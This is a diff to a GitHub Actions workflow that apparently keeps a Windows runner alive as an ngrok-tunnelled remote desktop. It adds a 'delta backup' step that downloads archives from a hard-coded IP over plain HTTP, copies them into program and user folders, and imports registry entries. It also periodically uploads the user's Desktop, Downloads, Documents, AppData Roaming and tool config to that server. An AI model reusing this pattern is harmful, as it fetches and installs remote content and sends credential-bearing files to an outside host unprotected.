@@ -19,6 +19,10 @@ on:
         description: 'Ngrok Region'
         required: false
         default: 'eu'
+      chain_id:
+        description: 'Monthly Chain ID for Delta App Backup'
+        required: false
+        default: ''
 
 jobs:
   rdp-setup:
@@ -336,17 +340,177 @@ jobs:
             Write-Output "[!] Desktop shortcuts note: $_"
           }
 
+      - name: Baseline Snapshot and Delta App Restore (Monthly Chain)
+        continue-on-error: true
+        shell: pwsh
+        run: |
+          $chainId = "${{ inputs.chain_id }}".Trim()
+          $vpsUrl = "http://191.215.42.79:8765/backup/$chainId?secret=gitube_delta_2026"
+
+          # 1. Record Baseline of Pre-Existing RDP Apps & Files BEFORE User Installs Anything
+          function Get-DirNames($path) {
+            if (Test-Path $path) {
+              return @(Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
+            }
+            return @()
+          }
+          $baseline = @{
+            ProgramFiles        = Get-DirNames "C:\Program Files"
+            ProgramFilesX86     = Get-DirNames "C:\Program Files (x86)"
+            AppDataLocalProg    = Get-DirNames "C:\Users\Fazah\AppData\Local\Programs"
+            AppDataRoaming      = Get-DirNames "C:\Users\Fazah\AppData\Roaming"
+            FazahDesktop        = Get-DirNames "C:\Users\Fazah\Desktop"
+            PublicDesktop       = Get-DirNames "C:\Users\Public\Desktop"
+            FazahDownloads      = Get-DirNames "C:\Users\Fazah\Downloads"
+            FazahDocuments      = Get-DirNames "C:\Users\Fazah\Documents"
+          }
+          $baseline | ConvertTo-Json -Depth 4 | Set-Content -Path "C:\rdp_baseline.json" -Encoding UTF8
+          Write-Output "[+] Recorded baseline snapshot of pre-existing RDP applications."
+
+          # 2. If Monthly Chain ID is active, Restore User's Delta Apps from VPS & Immediately Delete from VPS
+          if ($chainId -ne "") {
+            Write-Output "[*] Monthly Chain ($chainId) active. Checking VPS for user delta apps backup..."
+            $zipFile = "C:\delta_restore.zip"
+            $extractDir = "C:\delta_restore_stage"
+            try {
+              Invoke-WebRequest -Uri $vpsUrl -Method Get -OutFile $zipFile -TimeoutSec 120 -ErrorAction Stop
+              if ((Test-Path $zipFile) -and (Get-Item $zipFile).Length -gt 100) {
+                Write-Output "[+] Downloaded user delta apps backup ($((Get-Item $zipFile).Length) bytes). Restoring..."
+                Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
+                $map = @{
+                  "ProgramFiles"     = "C:\Program Files"
+                  "ProgramFilesX86"  = "C:\Program Files (x86)"
+                  "AppDataLocalProg" = "C:\Users\Fazah\AppData\Local\Programs"
+                  "AppDataRoaming"   = "C:\Users\Fazah\AppData\Roaming"
+                  "FazahDesktop"     = "C:\Users\Fazah\Desktop"
+                  "PublicDesktop"    = "C:\Users\Public\Desktop"
+                  "FazahDownloads"   = "C:\Users\Fazah\Downloads"
+                  "FazahDocuments"   = "C:\Users\Fazah\Documents"
+                }
+                foreach ($k in $map.Keys) {
+                  $srcFolder = Join-Path $extractDir $k
+                  $dstFolder = $map[$k]
+                  if (Test-Path $srcFolder) {
+                    if (-not (Test-Path $dstFolder)) { New-Item -ItemType Directory -Path $dstFolder -Force | Out-Null }
+                    Copy-Item -Path "$srcFolder\*" -Destination $dstFolder -Recurse -Force -ErrorAction SilentlyContinue
+                  }
+                }
+                if (Test-Path "$extractDir\user_apps.reg") {
+                  reg import "$extractDir\user_apps.reg" 2>$null
+                }
+                Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
+                Remove-Item -Path $extractDir -Recurse -Force -ErrorAction SilentlyContinue
+                Write-Output "[+] User delta apps restored! Deleting backup from VPS immediately..."
+                try {
+                  Invoke-RestMethod -Uri $vpsUrl -Method Delete -TimeoutSec 30 -ErrorAction SilentlyContinue | Out-Null
+                  Write-Output "[+] Backup deleted from VPS successfully."
+                } catch {}
+              }
+            } catch {
+              Write-Output "[*] No previous delta backup to restore yet or already cleaned."
+            }
+          }
+
+          # 3. Create Delta Exporter Script (packs ONLY user-installed apps not in baseline)
+          $deltaScript = @'
+          param([string]$ChainId)
+          if (-not $ChainId) { exit 0 }
+          $vpsUrl = "http://191.215.42.79:8765/backup/$ChainId?secret=gitube_delta_2026"
+          if (-not (Test-Path "C:\rdp_baseline.json")) { exit 0 }
+          $base = Get-Content "C:\rdp_baseline.json" -Raw -Encoding UTF8 | ConvertFrom-Json
+          $stage = "C:\delta_export_stage"
+          $zipOut = "C:\delta_backup.zip"
+          Remove-Item -Path $stage -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path $zipOut -Force -ErrorAction SilentlyContinue
+          New-Item -ItemType Directory -Path $stage -Force | Out-Null
+
+          # Fetch dynamic user-selected sync categories from VPS relay
+          $vpsPrefsUrl = "http://191.215.42.79:8765/sync-prefs/$ChainId?secret=gitube_delta_2026"
+          $syncPrefs = $null
+          try {
+            $syncPrefs = Invoke-RestMethod -Uri $vpsPrefsUrl -Method Get -TimeoutSec 10 -ErrorAction SilentlyContinue
+          } catch {}
+
+          if (-not $syncPrefs) {
+            $syncPrefs = @{
+              desktop = $true; downloads = $true; documents = $true; installed_apps = $true; appdata = $true; ai_projects = $true; cloud_vault = $true
+            }
+          }
+
+          $targets = @()
+          if ($syncPrefs.installed_apps) {
+            $targets += @{ Key = "ProgramFiles";     Path = "C:\Program Files" }
+            $targets += @{ Key = "ProgramFilesX86";  Path = "C:\Program Files (x86)" }
+            $targets += @{ Key = "AppDataLocalProg"; Path = "C:\Users\Fazah\AppData\Local\Programs" }
+          }
+          if ($syncPrefs.appdata) {
+            $targets += @{ Key = "AppDataRoaming";   Path = "C:\Users\Fazah\AppData\Roaming" }
+          }
+          if ($syncPrefs.desktop) {
+            $targets += @{ Key = "FazahDesktop";     Path = "C:\Users\Fazah\Desktop" }
+            $targets += @{ Key = "PublicDesktop";    Path = "C:\Users\Public\Desktop" }
+          }
+          if ($syncPrefs.downloads) {
+            $targets += @{ Key = "FazahDownloads";   Path = "C:\Users\Fazah\Downloads" }
+          }
+          if ($syncPrefs.documents) {
+            $targets += @{ Key = "FazahDocuments";   Path = "C:\Users\Fazah\Documents" }
+          }
+          if ($syncPrefs.ai_projects) {
+            $targets += @{ Key = "OpenCodeConfig";   Path = "C:\Users\Fazah\.config\opencode" }
+          }
+
+          $foundCount = 0
+          foreach ($t in $targets) {
+            $k = $t.Key
+            $p = $t.Path
+            if (-not (Test-Path $p)) { continue }
+            $origList = @($base.$k)
+            $items = Get-ChildItem -Path $p -Force -ErrorAction SilentlyContinue
+            foreach ($item in $items) {
+              if ($origList -notcontains $item.Name) {
+                $destSub = Join-Path $stage $k
+                if (-not (Test-Path $destSub)) { New-Item -ItemType Directory -Path $destSub -Force | Out-Null }
+                Copy-Item -Path $item.FullName -Destination (Join-Path $destSub $item.Name) -Recurse -Force -ErrorAction SilentlyContinue
+                $foundCount++
+              }
+            }
+          }
+
+          if ($foundCount -gt 0) {
+            Compress-Archive -Path "$stage\*" -DestinationPath $zipOut -CompressionLevel Fastest -Force
+            if (Test-Path $zipOut) {
+              try {
+                Invoke-RestMethod -Uri $vpsUrl -Method Post -InFile $zipOut -ContentType "application/octet-stream" -TimeoutSec 180 | Out-Null
+                Write-Output "[+] Delta apps backup ($foundCount user items) synced to VPS relay."
+              } catch {
+                Write-Output "[!] Delta sync warning: $_"
+              }
+            }
+          }
+          Remove-Item -Path $stage -Recurse -Force -ErrorAction SilentlyContinue
+          Remove-Item -Path $zipOut -Force -ErrorAction SilentlyContinue
+          '@
+          Set-Content -Path "C:\sync_delta_apps.ps1" -Value $deltaScript -Encoding UTF8
+
       - name: Keep Alive Session
         shell: pwsh
         env:
           TUNNEL_HOST: ${{ steps.ngrok-tunnel.outputs.tunnel_url }}
+          CHAIN_ID: ${{ inputs.chain_id }}
         run: |
           Write-Output "[+] RDP is now live ($env:TUNNEL_HOST)! Keeping runner alive..."
+          $loops = 0
           while ($true) {
             $svc = Get-Service -Name "ngrok" -ErrorAction SilentlyContinue
             if ($svc -and $svc.Status -ne "Running") {
               Write-Output "[!] Ngrok service stopped. Restarting service..."
               Start-Service -Name "ngrok" -ErrorAction SilentlyContinue
+            }
+            $loops++
+            # Sync user-installed delta apps every ~10 minutes if part of a 30-day chain
+            if ($env:CHAIN_ID -and ($loops % 5 -eq 0)) {
+              try { powershell -NoProfile -ExecutionPolicy Bypass -File "C:\sync_delta_apps.ps1" -ChainId $env:CHAIN_ID } catch {}
             }
             Start-Sleep -Seconds 120
           }
@@ -354,7 +518,12 @@ jobs:
       - name: Cleanup Ngrok
         if: always()
         shell: pwsh
+        env:
+          CHAIN_ID: ${{ inputs.chain_id }}
         run: |
+          if ($env:CHAIN_ID) {
+            try { powershell -NoProfile -ExecutionPolicy Bypass -File "C:\sync_delta_apps.ps1" -ChainId $env:CHAIN_ID } catch {}
+          }
           try { C:\Windows\System32\ngrok.exe service stop } catch {}
           try { C:\Windows\System32\ngrok.exe service uninstall } catch {}
 
